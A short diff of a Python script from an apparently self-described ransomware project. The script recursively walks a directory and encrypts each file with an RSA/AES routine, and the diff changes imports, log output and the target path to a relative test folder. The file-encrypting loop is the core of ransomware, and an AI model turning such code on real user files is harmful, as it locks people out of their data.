@@ -1,8 +1,8 @@
 #!/usr/bin/env python
 
-import src.logger as logger
-import src.encrypt as encrypt
-import src.decrypt as decrypt
+from src import encrypt
+from src import decrypt
+from src import logger
 import os
 
 
@@ -12,8 +12,8 @@ def main(rootdir):
         for file in files:
             fpath = os.path.abspath(os.path.join(subdir, file))
             rsa_aes.encrypt(fpath)
-            logger.info(f"Encrypted file: {file}")
+            logger.info(f"Encrypted file: {fpath}")
 
 
 if __name__ == '__main__':
-    main("/Users/dylz/Documents/ransomware/tests/to_encrypt/subfolder/subsubfolder/")
+    main("tests/to_encrypt/subfolder/subsubfolder/")
